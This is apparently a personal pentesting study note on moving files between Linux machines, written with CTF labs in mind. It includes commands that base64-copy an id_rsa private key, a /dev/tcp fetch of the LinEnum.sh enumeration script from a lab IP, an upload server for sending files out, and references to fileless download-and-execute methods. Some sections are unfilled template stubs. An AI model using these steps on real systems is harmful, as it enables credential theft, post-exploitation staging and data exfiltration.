# Linux File Transfer

## Overview

What this technique is and when I need it

## Downloading

### Base64 Encoding

**Step 1:** Check the MD5 hash of the contents.
```bash
md5sum id_rsa
```

**Step 2:** Encode contents to base64 and copy it to clipboard.
```bash
cat id_rsa | base64 -w 0; echo
```

**Step 3:** On the second Linux machine, decode the Base64 file content.
```bash
echo -n 'encoded' | base64 -d > id_rsa
```

**Step 4:** Confirm the MD5 hash matches.
```bash
md5sum id_rsa
```

### wget

#### Method 1: Download

Download a file.
![[wget#^simple-download]]

#### Method 2: Download - Fileless

Download and execute a file in memory (fileless).
![[wget#^fileless-download]]

### cURL

#### Method 1: Download

Download a file.
![[curl#^simple-download]]

#### Method 2: Download - Fileless

Download and execute a file in memory (fileless).
![[curl#^fileless-download]]

### Bash

#### Method 1: /dev/tcp

**Step 1:** Connect to the target webserver.
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

**Step 2:** Send a HTTP GET request for the file.
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Step 3:** Print the response.
```bash
cat <&3
```

### SSH

#### Method 1: SCP

![[SCP#^download-file-from-linux]]

## Uploading

### HTTP

#### Method 1: uploadserver

**Step 1:** Create a Self-Signed Cerfificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**Step 2:** Start the webserver
```bash
mkdir www && cd www; sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

**Step 3:** Upload files.
![[curl#^upload-multiple-files-insecure]]

#### Method 2: Python

**Step 1:** Create a webserver in python3
![[Python#^python3-webserver]]
or
**Step 1:** Create a webserver in python2.7
![[Python#^python2-7-webserver]]

**Step 2:** Download a file.
![[wget#^simple-download]]

#### Method 3: PHP

**Step 1:** Create a webserver.
![[PHP#^create-webserver]]

**Step 2:** Download a file.
![[wget#^simple-download]]
#### Method 4: Ruby

**Step 1:** Create a webserver.
![[ruby#^create-webserver]]

**Step 2:** Download a file.
![[wget#^simple-download]]

#### Method 4: Ruby

**Step 1:** Create a webserver.
![[ruby#^create-webserver]]

**Step 2:** Download a file.
![[wget#^simple-download]]

### SSH

#### Method 1: SCP

![[SCP#^upload-file-to-linux]]



## Practical Examples

Real-world scenarios where I've used this

## Troubleshooting

- Common issues I've encountered
- Things that break this technique
- Environment-specific considerations

## Related Techniques

- [[Similar-Technique]] - How they differ
- [[Follow-up-Technique]] - What comes next

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #linux-file-transfer
SORT file.ctime DESC
LIMIT 5
```

## Learning Resources

- 

#linux-file-transfer #technique